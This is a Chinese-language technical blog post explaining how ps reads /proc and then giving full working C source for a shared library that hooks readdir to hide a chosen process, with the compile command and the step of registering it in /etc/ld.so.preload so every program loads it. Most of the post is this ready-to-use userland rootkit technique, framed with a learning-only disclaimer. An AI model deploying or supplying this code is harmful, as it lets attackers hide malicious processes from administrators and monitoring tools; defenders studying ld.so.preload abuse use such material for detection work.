---
title: 通过 ld.so.preload 覆盖系统库，隐藏 Linux 进程
date: 2019-05-19 23:50:00
categories: Programming
tags:
- Linux
- Hack
---

> 本文旨在学习 linux 内核原理，纯粹用于技术探讨，请勿用于非法目的。

## `ps`指令是如何工作的？

我们可以使用 `sysdig` 跟踪 `ps` 指令的执行细节

```bash
$ sysdig proc.name = ps
...
2088196 23:47:45.419817127 7 ps (22956) > openat
2088197 23:47:45.419818054 7 ps (22956) < openat fd=6(<f>/proc/30245/stat) dirfd=-100(AT_FDCWD) name=/proc/30245/stat flags=1(O_RDONLY) mode=0
2088198 23:47:45.419818411 7 ps (22956) > read fd=6(<f>/proc/30245/stat) size=2048
2088199 23:47:45.419819843 7 ps (22956) < read res=182 data=30245 ((sd-pam)) S 30244 30244 30244 0 -1 1077936448 46 0 0 0 0 0 0 0 20 0 1 0 1
2088200 23:47:45.419820050 7 ps (22956) > close fd=6(<f>/proc/30245/stat)
2088201 23:47:45.419820178 7 ps (22956) < close res=0
2088202 23:47:45.419822308 7 ps (22956) > openat
2088203 23:47:45.419824137 7 ps (22956) < openat fd=6(<f>/proc/30245/status) dirfd=-100(AT_FDCWD) name=/proc/30245/status flags=1(O_RDONLY) mode=0
2088204 23:47:45.419824495 7 ps (22956) > read fd=6(<f>/proc/30245/status) size=2048
2088205 23:47:45.419829683 7 ps (22956) < read res=1329 data=Name:.(sd-pam).Umask:.0002.State:.S (sleeping).Tgid:.30245.Ngid:.0.Pid:.30245.PP
2088206 23:47:45.419829879 7 ps (22956) > close fd=6(<f>/proc/30245/status)
2088207 23:47:45.419830002 7 ps (22956) < close res=0
2088208 23:47:45.419831829 7 ps (22956) > getdents fd=5(<d>/proc)
2088209 23:47:45.419833030 7 ps (22956) < getdents res=0
2088210 23:47:45.419834153 7 ps (22956) > close fd=5(<d>/proc)
2088211 23:47:45.419834873 7 ps (22956) < close res=0
...
```

由此可以分析出 `ps` 的执行流程如下：
1. 通过 `openat` 函数打开目录 `/proc`。
2. 在该进程在打开的目录上调用 `getdents` 函数，得到 `/proc` 下的目录列表
3. 遍历每个子目录中的一组固定文件。从事件列表中可以看到，这些文件名为 `/proc/{PID}/status`，`/proc/PID/stat` 和 `/proc/PID/cmdline`，即为 `ps` 输出的信息。

> 进程本身不直接调用 `openat` 和 `getdents`， 因为这些是由C标准库（`libc`）抽象的系统调用。如果你曾经读过 `libc` 文档，`libc` 提供了两个不同的函数，`opendir` 和 `readdir`，它们负责自己调用系统调用，为开发人员提供了一个更简单的API。

## 3种隐藏进程的思路

1. 修改替换类似 `ps`、`lsof`、`top`、`htop` ... 等常用运维工具的二进制文件。
2. 覆盖 `libc` 中的 `readdir` 函数
3. 修改内核中的系统调用，hook 系统的 `getdents` 事件

下文采用第二种方法来实现

## 示例代码 (C)

### 新建 `processhider.c`

修改 `process_to_filter` 为你要隐藏的进程名

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

// !!! Replace to your Process Name
static const char* process_to_filter = "test.py";

static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
                strcmp(process_name, process_to_filter) == 0) {         \
                continue;                                               \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
```

### 编译成动态链接库

```bash
$ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
$ mv libprocesshider.so /usr/local/lib/
```

### 覆盖系统调用

`/etc/ld.so.preload` 这是个神奇的文件，写在这个文件里的库会比系统标准库优先调用。因此我们只要把刚才生成好的动态链接库添加到这个文件中就大功告成了

```bash
$ echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```

### 测试结果

新建一个测试文件 `test.py`

```python
#!/usr/bin/python

while True:
    print "Hello"
```

执行

```bash
$ chmod +x test.py
$ ./test.py
```

再开一个 `terminal` 查看 `ps` 或者 `top`，发现 `test.py` 已经不见了。
